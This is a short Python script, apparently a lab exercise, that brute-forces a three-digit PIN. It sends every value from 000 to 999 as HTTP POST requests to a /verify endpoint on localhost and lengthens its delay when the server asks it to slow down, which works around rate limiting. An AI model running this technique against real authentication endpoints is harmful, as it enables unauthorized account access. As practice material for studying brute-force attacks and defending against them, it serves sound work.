import socket
import time

# Set up the Address and Port
Address = '127.0.0.1'  # localhost address
Port = 8888            # Port number of the server


# Inital sleep time between requests to avoiv overwhelming the server
sleep_time = 1.0 


# Loop through all possible PINs (000 to 999)
for pin in range(0, 1000):
    formatted_pin = f"{pin:03d}"  # Formatted the PIN to always have 3 digits

    try:
        
        # Create new socket object for each attempt
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the target server
        client_socket.connect((Address, Port))

        # Construct the body of the Post request wuth the formatted PIN
        body = f"magicNumber={formatted_pin}"
        request = (
            f"POST /verify HTTP/1.1\r\n"
            f"Host: {Address}:{Port}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
            f"{body}"  # Add the PIN body to the request
        )

        # Send the request to the server
        client_socket.sendall(request.encode())

        # Receive the server's response
        response = b""
        while True:
            part = client_socket.recv(4096)   # Receive data in chunks
            if not part:
                break
            response += part
        
        
        # Decode the respinse and handle possible errors
        decoded_response = response.decode(errors="ignore")

        # Check if the server's response indicates a successful PIN guess
        if "congratulations" in decoded_response.lower() or "access granted" in decoded_response.lower() or "welcome" in decoded_response.lower():
            print(f"[+] Found correct PIN: {formatted_pin}")
            print(decoded_response) 
            break # Stop the loop when the correct PIN is found

        # If the server requests slowdown, increase the sleep time
        elif "slow down" in decoded_response.lower():
            print(f"[!] Server said slow down after PIN {formatted_pin}. Increasing sleep time...")
            sleep_time += 0.5
        else:

            # If the PIN is incorrect, print the attempt
            print(f"[-] Tried PIN: {formatted_pin}")

    except Exception as e:

        # If there is an error, print the error
        print(f"[!] Error with PIN {formatted_pin}: {e}")

    finally:

        # Always close the socket after the attempt
        client_socket.close()
    
    # Sleep for a while to avoid sending too many request too quickly
    time.sleep(sleep_time)

# Print a message when brute forcing is completed
print("Brute force completed")
